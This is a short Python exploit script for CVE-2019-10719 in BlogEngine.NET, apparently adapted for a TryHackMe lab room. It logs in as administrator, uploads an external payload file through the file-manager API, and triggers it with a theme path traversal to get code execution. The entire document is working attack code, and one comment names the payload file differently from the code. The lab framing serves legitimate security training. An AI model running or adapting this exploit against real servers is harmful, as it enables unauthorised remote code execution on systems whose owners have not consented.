#!/usr/bin/env python

# Simplifed version of Aaron Bisop's CVE-2019-10719 exploit adapted for Try Hack Me's HackPark room.
# The original script is available at https://github.com/irbishop/CVEs/blob/master/2019-10719/exploit.py
# This version requires an external 'PostView.aspx' payload as described in the accompanying guide.

import re
import sys

from requests import Session

# CONFIGURATION
IP = 'http://'
USER = 'admin'
PWORD = ''

PATHS = {
    'login': '/Account/login.aspx',
    'upload': '/api/upload?action=filemgr&dirPath=~/App_Data/files',
    'exploit': '?theme=../../App_Data/files',
}

def build_endpoint(url: str, path:str) -> str:
    return f'{url}{path}'

def login(session: Session, endpoint: str, user: str, passwd: str) -> None:
    resp = session.get(endpoint)
    # Parse randomly generated values required to validate the login request
    login_form = re.findall('<input\s+.*?name="(?P<name>.*?)"\s+.*?(?P<tag>\s+value="(?P<value>.*)")?\s/>', resp.text)
    # this can be a dictionary comprehension!
    login_data = dict([(i[0],i[2]) for i in login_form])
    login_data.update({'ctl00$MainContent$LoginUser$UserName': user})
    login_data.update({'ctl00$MainContent$LoginUser$Password': passwd})
    resp = session.post(endpoint, login_data)

def main() -> None:

    if not (IP and PWORD):
        sys.exit('Please configure IP and PWORD variables. Exiting ...')

    # Init session to persist cookies between requests
    s = Session()

    # Login to get auth cookie
    login(s, build_endpoint(IP, PATHS['login']), USER, PWORD)

    # Read payload file from cwd and upload
    with open('PostView.ascx', 'rb') as payload:
        s.post(build_endpoint(IP, PATHS['upload']), files=payload)

    # Traverse to vulnerable path to execute payload
    s.get(build_endpoint(IP, PATHS['exploit']))

if __name__ == '__main__':
    main()